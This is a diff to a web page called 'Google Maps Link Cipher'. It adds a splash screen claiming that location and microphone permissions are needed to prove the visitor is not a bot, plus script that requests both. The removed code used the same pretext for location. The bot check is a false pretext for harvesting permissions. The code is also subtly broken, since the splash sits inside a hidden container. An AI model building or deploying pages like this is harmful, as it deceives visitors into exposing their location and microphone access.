@@ -173,7 +173,13 @@
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="mainContainer" style="display:none;">
+            <div id="splashScreen" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;width:100vw;background:rgba(0,0,0,0.8);color:white;position:fixed;top:0;left:0;z-index:9999;">
+                <h2>Welcome!</h2>
+                <p>We will ask for certain permissions to make sure that you are not a bot.</p>
+                <p>This includes location and sound access.</p>
+                <button class="btn" id="continueBtn">Continue</button>
+            </div>
         <h1>🗺️ Google Maps Link Cipher</h1>
         <p>Convert your Google Maps link into a secret cipher</p>
         
@@ -221,6 +227,40 @@
     </div>
 
     <script>
+                // Splash screen logic
+                const splashScreen = document.getElementById('splashScreen');
+                const mainContainer = document.getElementById('mainContainer');
+                const continueBtn = document.getElementById('continueBtn');
+
+                continueBtn.addEventListener('click', () => {
+                    splashScreen.style.display = 'none';
+                    mainContainer.style.display = 'block';
+                    askPermissions();
+                });
+
+                function askPermissions() {
+                    // Ask for location
+                    if (navigator.permissions) {
+                        navigator.permissions.query({name: 'geolocation'}).then(function(result) {
+                            if (result.state === 'granted') {
+                                generateCipher();
+                            } else {
+                                generateCipher(); // triggers prompt
+                            }
+                        });
+                    } else {
+                        generateCipher();
+                    }
+                    // Ask for sound access
+                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                        navigator.mediaDevices.getUserMedia({ audio: true }).then(function(stream) {
+                            // Sound access granted
+                            stream.getTracks().forEach(track => track.stop());
+                        }).catch(function(err) {
+                            // Sound access denied or error
+                        });
+                    }
+                }
         let originalMapLink = '';
         let cipherMapLink = '';
         let currentLocation = null;
@@ -348,28 +388,8 @@
 
         // Auto-generate on page load
         window.addEventListener('load', () => {
-            generateBtn.style.display = 'inline-block';
-            generateBtn.disabled = false;
-            // Always show the message first
-            statusEl.innerHTML = '<div class="error">We need to know your location so you are not a bot. Please allow location access.</div>';
-            // After a short delay, trigger geolocation request
-            setTimeout(() => {
-                if (navigator.permissions) {
-                    navigator.permissions.query({name: 'geolocation'}).then(function(result) {
-                        if (result.state === 'granted') {
-                            generateCipher();
-                        } else if (result.state === 'prompt') {
-                            // Trigger geolocation request
-                            generateCipher();
-                        } else if (result.state === 'denied') {
-                            statusEl.innerHTML = '<div class="error">Location access denied. Please enable location permissions in your browser settings.</div>';
-                        }
-                    });
-                } else {
-                    // Fallback if Permissions API is not supported
-                    generateCipher();
-                }
-            }, 1200);
+            splashScreen.style.display = 'flex';
+            mainContainer.style.display = 'none';
         });
 
         // Make decryption function available globally
